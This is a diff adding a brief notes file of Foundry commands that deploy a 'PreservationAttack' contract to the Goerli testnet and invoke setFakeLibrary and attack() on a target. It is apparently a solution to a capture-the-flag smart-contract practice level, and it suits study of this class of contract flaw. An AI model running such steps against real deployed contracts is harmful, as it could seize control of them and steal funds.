@@ -1,0 +1,16 @@
+1. forge create src/16Preservation/Solution2.sol:PreservationAttack \
+ --rpc-url https://goerli.infura.io/v3/{key} \
+ --private-key {key} \
+ --constructor-args "0x1b8948647c8D8B07a544a8e40587D43e98Eb5a7F" \
+ --etherscan-api-key {key} \
+ --verify 
+
+
+2. cast send 0xEFAFB23F0FE66F06C4B29E1e201366D9e1402410 "setFakeLibrary(address _fakeLib)" 0x81a4B5588b39b3438bCf9012656909B874A8E23F \
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key}
+
+3. cast send 0xEFAFB23F0FE66F06C4B29E1e201366D9e1402410 "attack()" \
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key} \
+--gas-limit 500000 
